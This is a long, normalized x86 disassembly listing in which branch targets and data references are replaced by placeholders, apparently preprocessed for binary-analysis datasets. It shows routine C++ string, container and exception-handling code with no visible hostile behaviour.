mov [ ebp - 0x18 ] ecx
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ eax + 0x18 ]
mov eax [ eax ]
lea edi [ ebp - 0x20 ]
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] eax
call sub_40f543
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0xc ] eax
xor edi edi
mov [ ebp - 0x4 ] esi
cmp eax edi
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
cmp eax 0x2
jne r-xdata
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xe4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x10 ] esi
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
push edi
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
push [ ebp + 0xc ]
call sub_41ec78
mov edi eax
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push 0x0
push esi
lea ecx [ ebp - 0x90 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x58 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push 0x0
push esi
lea ecx [ ebp - 0x74 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x58 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x58 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x8
mov esi [ edi ]
mov eax [ ebx ]
mov ecx ebx
add esi 0x10
call [ eax + 0x74 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx edi
call [ esi ]
or [ ebp - 0x4 ] 0xffffffff
xor esi esi
push esi
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x58 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x9
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
mov edx [ edi ]
add eax 0x8c
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx edi
call [ edx + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0xa
cmp eax esi
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push 0x0
push esi
lea ecx [ ebp - 0xe4 ]
call sub_40415f
xor ebx ebx
push r--data
lea ecx [ ebp - 0xac ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x10 ] 0x4
push r--data
lea ecx [ ebp - 0x74 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xc
or [ ebp - 0x10 ] 0x8
push r--data
lea ecx [ ebp - 0x58 ]
call sub_403dc1
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0xd
or [ ebp - 0x10 ] 0x10
push eax
push [ ebp + 0xc ]
mov ebx edi
call sub_41ee71
mov ebx eax
jmp r-xdata
test [ ebp - 0x10 ] 0x8
je r-xdata
and [ ebp - 0x10 ] 0xffffffef
push esi
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_40415f
test [ ebp - 0x10 ] 0x10
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x4
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
push esi
push 0x1
lea ecx [ ebp - 0x74 ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x11
cmp eax esi
je r-xdata
and [ ebp - 0x10 ] 0xfffffffb
push esi
push 0x1
lea ecx [ ebp - 0xac ]
call sub_40415f
test [ ebp - 0x10 ] 0x40
je r-xdata
push r--data
lea ecx [ ebp - 0x100 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x12
or [ ebp - 0x10 ] 0x20
push r--data
lea ecx [ ebp - 0xc8 ]
call sub_403dc1
push rw-data
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x13
or [ ebp - 0x10 ] 0x40
push eax
push [ ebp + 0xc ]
call sub_41ee71
xor esi esi
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x20
je r-xdata
and [ ebp - 0x10 ] 0xffffffbf
push esi
push 0x1
lea ecx [ ebp - 0xc8 ]
call sub_40415f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x14 ]
push esi
push 0x1
lea ecx [ ebp - 0x100 ]
call sub_40415f
sub_40e438
push 0x1c4
mov eax sub_43db24
call sub_425e16
xor esi esi
mov edi ecx
mov [ ebp - 0xf4 ] esi
cmp [ edi + 0x36c ] esi
je r-xdata
mov eax [ edi + 0x2b8 ]
mov eax [ eax ]
mov ecx [ edi + 0x2a4 ]
mov [ ebp - 0xfc ] ecx
mov [ ebp - 0xf8 ] eax
push r--data
lea ecx [ ebp - 0x160 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x198 ]
mov [ ebp - 0x4 ] esi
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x160 ]
push ecx
lea ecx [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x48 ]
push esi
push 0x1
lea ecx [ ebp - 0x198 ]
mov [ ebp - 0x10c ] eax
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x160 ]
call sub_40415f
cmp [ ebp - 0x10c ] 0x0
mov esi r--data
je r-xdata
call sub_423d5c
cmp [ ebp - 0xfc ] eax
je r-xdata
mov [ ebp - 0xfd ] 0x0
push esi
lea ecx [ ebp - 0x17c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push esi
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0xf4 ] 0x1
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
push r--data
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0xf4 ] eax
call sub_403dc1
mov ecx [ ebp - 0x10c ]
lea edx [ ebp - 0x17c ]
push edx
lea edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x4 ] 0x4
mov eax [ ecx ]
lea edx [ ebp - 0x144 ]
push edx
mov [ ebp - 0xf4 ] 0x7
call [ eax + 0x50 ]
mov [ ebp - 0xfd ] 0x1
test al al
jne r-xdata
mov eax [ edi + 0x2b8 ]
mov eax [ eax ]
mov ecx [ edi + 0x2a4 ]
mov [ ebp - 0xfc ] ecx
mov [ ebp - 0xf8 ] eax
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
lea esi [ ebp - 0xfc ]
mov [ ebp - 0x104 ] eax
call sub_40f2a9
mov eax [ eax ]
mov ecx [ ebp - 0x104 ]
add ecx 0x8c
add eax 0x94
call sub_40561a
test al al
je r-xdata
cmp [ ebp - 0xf8 ] esi
je r-xdata
test [ ebp - 0xf4 ] 0x2
je r-xdata
and [ ebp - 0xf4 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_40415f
test [ ebp - 0xf4 ] 0x4
je r-xdata
call sub_423d5c
cmp [ ebp - 0xfc ] eax
je r-xdata
lea esi [ ebp - 0xfc ]
call sub_408d54
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0xf4 ] 0x1
je r-xdata
and [ ebp - 0xf4 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_40415f
call [ eax + 0x68 ]
cmp eax 0x1000
je r-xdata
call [ eax + 0x6c ]
lea esi [ ebp - 0xfc ]
mov [ ebp - 0x104 ] eax
call sub_40f2a9
mov eax [ eax ]
mov ecx [ ebp - 0x104 ]
add ecx 0x70
add eax 0x78
call sub_40561a
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
cmp [ ebp - 0xf8 ] esi
je r-xdata
cmp [ ebp - 0xfc ] 0x0
mov esi [ edi + 0x2b8 ]
mov eax [ edi + 0x2a4 ]
je r-xdata
lea esi [ ebp - 0xfc ]
call sub_40f2a9
mov eax [ eax ]
mov esi [ eax + 0xec ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
test esi eax
jne r-xdata
call sub_40f2a9
mov esi [ eax ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
lea edx [ esi + 0xd0 ]
mov ecx eax
mov eax edx
call sub_40561a
test al al
je r-xdata
cmp [ ebp - 0xfd ] 0x0
je r-xdata
and [ ebp - 0xf4 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
call sub_40415f
mov esi [ edi + 0x370 ]
cmp eax 0x4000
je r-xdata
lea esi [ ebp - 0xfc ]
call sub_408d54
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
lea esi [ ebp - 0xfc ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
jmp r-xdata
lea esi [ ebp - 0xfc ]
call sub_40f2a9
mov eax [ eax ]
cmp [ eax + 0xec ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x17c ]
call sub_403dc1
mov ecx [ ebp - 0x10c ]
lea edx [ ebp - 0x17c ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ecx ]
push edx
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x17c ]
mov [ ebp - 0x104 ] eax
call sub_40415f
push r--data
lea ecx [ ebp - 0x128 ]
call sub_403dc1
lea edx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x6
mov ecx [ ebp - 0x104 ]
mov eax [ ecx ]
push edx
lea edx [ ebp - 0x1b4 ]
push edx
call [ eax + 0x40 ]
push eax
lea eax [ ebp - 0xf0 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_401152
push 0x0
push 0x1
lea ecx [ ebp - 0x1b4 ]
call sub_40415f
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0xa
call sub_40415f
push r--data
lea ecx [ ebp - 0x144 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0x104 ]
mov eax [ ecx ]
lea edx [ ebp - 0x144 ]
push edx
call [ eax + 0x4c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0x4 ] 0xa
call sub_40415f
mov ecx [ ebp - 0xf8 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0x2d4 ]
mov eax [ eax ]
mov ecx [ edi + 0x2c0 ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x104 ] eax
push 0xf4
call sub_4246c6
pop ecx
mov [ ebp - 0x104 ] eax
mov [ ebp - 0x4 ] 0x18
test eax eax
je r-xdata
mov esi [ edi + 0x374 ]
jmp r-xdata
cmp eax 0x8000
je r-xdata
cmp [ ebp - 0xfc ] 0x0
mov esi [ edi + 0x2b8 ]
mov eax [ edi + 0x2a4 ]
je r-xdata
lea esi [ ebp - 0xfc ]
call sub_40f2a9
mov eax [ eax ]
mov esi [ eax + 0xec ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
test esi eax
jne r-xdata
call sub_40f2a9
mov esi [ eax ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x98 ]
lea edx [ esi + 0xd0 ]
mov ecx eax
mov eax edx
call sub_40561a
test al al
je r-xdata
push ebx
call [ eax + 0xc ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x1d0 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xc
or [ ebp - 0xf4 ] 0x8
mov eax [ ecx ]
call [ eax + 0x2c ]
jmp r-xdata
call sub_423d5c
cmp [ ebp - 0x108 ] eax
je r-xdata
xor edi edi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x68 ]
push eax
mov eax [ ebx ]
push 0x1
mov ecx ebx
call [ eax + 0x6c ]
push edi
push [ ebp - 0x104 ]
mov ecx eax
call sub_41674a
mov edi eax
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x378 ]
jmp r-xdata
cmp eax 0x10000
jne r-xdata
lea esi [ ebp - 0xfc ]
call sub_40f2a9
mov eax [ eax ]
cmp [ eax + 0xec ] 0x0
je r-xdata
call sub_425e60
retn
push r--data
lea ecx [ ebp - 0x128 ]
call sub_403dc1
mov ecx [ ebp - 0x10c ]
lea edx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0xf
mov eax [ ecx ]
push edx
call [ eax + 0x4c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0x4 ] 0xe
call sub_40415f
mov ecx [ ebp - 0xf8 ]
test ecx ecx
je r-xdata
and [ ebp - 0xf4 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x1d0 ]
call sub_40415f
push eax
lea ecx [ ebp - 0x48 ]
call sub_403de3
mov [ ebp - 0x4 ] 0xe
test [ ebp - 0xf4 ] 0x8
je r-xdata
lea esi [ ebp - 0x108 ]
call sub_40f2a9
mov ecx [ eax ]
mov eax [ ecx ]
push 0x0
push ebx
call [ eax + 0x4 ]
call sub_408d54
jmp r-xdata
cmp [ ebp - 0x104 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x4 ]
mov eax [ edi ]
mov ecx edi
mov esi [ edi + 0x37c ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x1b4 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x10
or [ ebp - 0xf4 ] 0x10
mov eax [ ecx ]
call [ eax + 0x2c ]
jmp r-xdata
cmp [ ebp - 0x108 ] 0x0
mov esi [ edi + 0x2d4 ]
mov eax [ edi + 0x2c0 ]
je r-xdata
push esi
lea ecx [ ebp - 0x198 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
push r--data
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4 ] 0x14
call sub_403dc1
push r--data
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x15
call sub_403dc1
lea ecx [ ebp - 0x128 ]
push ecx
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x4 ] 0x16
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x88 ]
mov [ ebp - 0xf8 ] eax
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x17
mov eax [ edi + 0x36c ]
mov esi [ eax ]
mov ecx [ ebp - 0x104 ]
mov eax [ ecx ]
lea edx [ ebp - 0x160 ]
push edx
lea edx [ ebp - 0x144 ]
push edx
add esi 0x4
call [ eax + 0x50 ]
movzx eax al
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0xf8 ]
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0xf0 ]
push eax
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
mov ecx [ edi + 0x36c ]
push eax
call [ esi ]
xor esi esi
xor edi edi
push esi
inc edi
push edi
lea ecx [ ebp - 0x1d0 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x128 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x144 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x160 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x198 ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x2c ]
call sub_40415f
push esi
push edi
lea ecx [ ebp - 0x48 ]
call sub_40415f
lea esi [ ebp - 0xf0 ]
call sub_4011ad
push 0x0
push 0x1
lea ecx [ ebp - 0x1b4 ]
call sub_40415f
push eax
lea ecx [ ebp - 0x2c ]
call sub_403de3
mov [ ebp - 0x4 ] 0x12
test [ ebp - 0xf4 ] 0x10
je r-xdata
sub_40ebbd
push 0x30
mov eax sub_43b0b5
call sub_425dad
and [ ebp - 0x14 ] 0x0
mov eax [ ebx + 0x344 ]
mov eax [ eax ]
mov ecx [ ebx + 0x330 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] eax
call sub_423d5c
cmp [ ebp - 0x20 ] eax
je r-xdata
call sub_425e4c
retn 0x4
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
call sub_40f2a9
mov ecx [ ebp - 0x18 ]
add eax 0x20
call sub_40561a
test al al
je r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
mov [ ebp - 0xd ] 0x0
push r--data
lea ecx [ ebp - 0x3c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
mov edi [ edi ]
or [ ebp - 0x14 ] 0x1
add edi 0x44
call sub_40f2a9
mov ecx [ ebp + 0x8 ]
add eax 0x4
push eax
lea eax [ ebp - 0x3c ]
push eax
call [ edi ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
and [ ebp - 0x14 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x14 ] 0x1
je r-xdata
lea esi [ ebp - 0x20 ]
call sub_408d54
jmp r-xdata
lea esi [ ebp - 0x20 ]
call sub_40f2a9
mov ecx [ eax ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp [ ebp - 0x20 ] 0x0
mov esi [ ebx + 0x344 ]
mov eax [ ebx + 0x330 ]
je r-xdata
sub_40eca9
push 0x8
mov eax sub_43b081
call sub_425dad
mov esi ecx
cmp [ esi + 0x23c ] 0x0
je r-xdata
xor eax eax
push 0x138
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0x1
sub esp 0x1c
lea edi [ esi + 0xc ]
add esi 0x1fc
mov ecx esp
mov [ ebp - 0x14 ] esp
push esi
call sub_403de3
mov ecx [ ebp - 0x10 ]
push edi
call sub_42049c
jmp r-xdata
call sub_425e4c
retn
sub_40ed02
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_404490
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40400a
mov eax esi
leave
retn 0xc
sub_40ed30
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
mov eax ebx
call sub_40545f
mov [ ebp - 0x4 ] eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x18 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
call sub_40f543
pop edi
pop esi
test al al
jne r-xdata
call sub_423d5c
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
add ecx 0xc
call sub_405664
test al al
jne r-xdata
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_40eda3
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_414157
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
mov eax esi
call sub_425e4c
retn 0x4
sub_40edf4
push 0x38
mov eax sub_43b05c
call sub_425dad
mov eax [ ebx + 0x18 ]
mov esi [ eax + 0x4 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x2d ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebx + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
lea edi [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] eax
call sub_40f543
test al al
jne r-xdata
mov [ ebp - 0x14 ] esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x44 ]
call sub_403de3
xor esi esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] esi
push [ ebp - 0x18 ]
lea eax [ ebp - 0x44 ]
push [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
call sub_41c008
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov [ ebp - 0x1c ] ecx
push 0x1
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x18 ] eax
call sub_40415f
mov ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
add ecx 0xc
call sub_405664
test al al
je r-xdata
lea esi [ ebp - 0x1c ]
call sub_40f2d4
add eax 0x1c
call sub_425e4c
retn 0x4
sub_40eeb0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0xc ]
lea edi [ esp + 0x24 ]
push [ ebp + 0x8 ]
call sub_40f55e
mov eax [ esp + 0x2c ]
mov ebx [ esp + 0x28 ]
and [ esp + 0xc ] 0x0
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] eax
jmp r-xdata
lea edi [ esp + 0x18 ]
lea esi [ esp + 0x10 ]
call sub_40f543
test al al
je r-xdata
inc [ esp + 0xc ]
lea esi [ esp + 0x10 ]
call sub_41bfbb
push [ esp + 0x2c ]
lea eax [ esp + 0x1c ]
push ebx
push [ esp + 0x2c ]
push [ esp + 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40fb91
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40ef37
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_4134c3
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x31 ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
mov eax esi
call sub_425e4c
retn 0x4
sub_40ef88
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b039
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea ebx [ esp + 0x14 ]
call sub_40f491
mov eax [ edi + 0x18 ]
mov [ esp + 0x1c ] eax
mov eax [ edi ]
lea edi [ esp + 0x18 ]
mov esi ebx
mov [ esp + 0x18 ] eax
call sub_40f543
mov esi [ esp + 0x14 ]
test al al
jne r-xdata
push [ ebp + 0xc ]
xor eax eax
lea edi [ esp + 0x1c ]
stosd [ edi ]
lea ecx [ esp + 0x2c ]
stosd [ edi ]
call sub_403de3
mov eax [ esp + 0x18 ]
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x48 ] eax
and [ esp + 0x58 ] 0x0
push esi
push [ esp + 0x14 ]
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40f2ff
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push 0x0
mov [ esp + 0x14 ] ecx
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x1c ] eax
call sub_40415f
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0xc ]
call sub_405664
test al al
je r-xdata
lea esi [ esp + 0x10 ]
call sub_40f2d4
add eax 0x1c
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40f06d
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ esi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ esi + 0x18 ] 0x0
cmp ecx [ esi + 0x14 ]
je r-xdata
push [ esi + 0x14 ]
call sub_42412e
push [ esi ]
and [ esi + 0x14 ] 0x0
call sub_42412e
pop ecx
pop ecx
retn
push edi
mov edi [ ecx ]
push ecx
call sub_42412e
pop ecx
mov ecx edi
cmp edi [ esi + 0x14 ]
jne r-xdata
pop edi
sub_40f0ab
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
lea esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_408d54
cmp edi [ ebx + 0x14 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebx ]
pop edi
mov [ eax ] ecx
pop esi
leave
retn 0xc
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov [ eax ] ecx
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
push edi
mov [ eax + 0x4 ] ecx
call sub_42412e
dec [ ebx + 0x18 ]
pop ecx
sub_40f0f4
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_4093ba
and [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov eax esi
call sub_425e4c
retn 0x4
sub_40f131
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
push 0x4
call sub_4246c6
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
and [ ebp - 0x4 ] 0x0
call sub_40f513
and [ esi + 0x18 ] 0x0
mov [ esi + 0x14 ] eax
mov eax esi
call sub_425e4c
retn 0x4
sub_40f16e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20
mov eax [ eax ]
mov ecx [ edi ]
push ebx
mov [ esp + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov ebx [ eax ]
push esi
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] ecx
mov [ esp + 0x18 ] ecx
call sub_423d5c
cmp eax [ esp + 0xc ]
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ esp + 0x18 ]
call sub_40f2a9
mov ecx [ esp + 0x14 ]
cmp [ eax ] ecx
jne r-xdata
cmp ebx [ esp + 0x10 ]
je r-xdata
lea esi [ esp + 0x18 ]
call sub_408d54
mov ebx [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x18 ]
lea esi [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] ebx
call sub_408d54
cmp ebx [ edi + 0x14 ]
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ebx [ esp + 0x24 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebx ]
mov [ eax ] ecx
